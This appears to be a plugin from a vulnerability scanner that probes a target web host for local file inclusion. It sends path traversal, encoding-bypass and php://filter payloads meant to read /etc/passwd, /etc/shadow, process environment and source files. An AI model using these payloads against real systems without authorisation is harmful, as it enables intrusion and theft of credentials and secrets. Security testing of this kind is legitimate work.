# plugins/lfi_scanner.py
def run(target, ip, open_ports, banners):
    """
    Scanner LFI (Local File Inclusion) / Path Traversal.
    Testa inclusão de arquivos locais via parâmetros GET comuns.
    """
    import requests

    params = ["file", "page", "path", "include", "template", "doc", "folder", "view",
              "content", "cat", "dir", "action", "board", "date", "detail", "download"]
    payloads = [
        ("../../../etc/passwd", "root:", "UNIX_PASSWD"),
        ("....//....//....//etc/passwd", "root:", "FILTER_BYPASS"),
        ("..%2f..%2f..%2fetc%2fpasswd", "root:", "URL_ENCODE"),
        ("..\\..\\..\\windows\\win.ini", "[fonts]", "WIN_INI"),
        ("/etc/shadow", "root:", "DIRECT_SHADOW"),
        ("php://filter/convert.base64-encode/resource=index.php", "PD9w", "PHP_FILTER"),
        ("file:///etc/hostname", "", "FILE_PROTO"),
        ("....//....//....//proc/self/environ", "PATH=", "PROC_ENVIRON"),
    ]
    vulns = []

    for param in params:
        for payload, indicator, method in payloads:
            url = f"http://{target}/?{param}={payload}"
            try:
                resp = requests.get(url, timeout=6)
                if resp.status_code == 200 and indicator and indicator in resp.text:
                    vulns.append({
                        "tipo": "LFI",
                        "parametro": param,
                        "payload": payload,
                        "metodo": method,
                        "severidade": "CRITICO",
                        "amostra": resp.text[:200],
                    })
                    break
            except Exception:
                continue

    return {"plugin": "lfi_scanner", "resultados": vulns if vulns else "Nenhum LFI detectado"}
